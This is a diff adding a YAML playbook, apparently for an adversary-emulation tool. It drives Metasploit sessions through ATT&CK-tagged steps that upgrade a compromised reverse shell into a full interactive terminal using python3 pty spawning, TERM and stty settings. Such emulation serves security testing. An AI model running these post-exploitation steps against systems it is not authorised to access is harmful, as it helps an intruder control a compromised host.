@@ -1,0 +1,49 @@
+commands:
+  - type: msf-session
+    cmd: shell
+    session: $UPGRADESESSION
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
+
+  - type: msf-session
+    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
+    session: $UPGRADESESSION
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
+
+  - type: msf-session
+    cmd: export SHELL=bash
+    session: $UPGRADESESSION
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
+
+  - type: msf-session
+    cmd: export TERM=xterm256-color
+    session: $UPGRADESESSION
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
+
+  - type: msf-session
+    cmd: stty rows 38 columns 116
+    session: $UPGRADESESSION
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
+
+  # needed for xclip and wmctrl
+  - type: msf-session
+    cmd: export DISPLAY=:0
+    session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
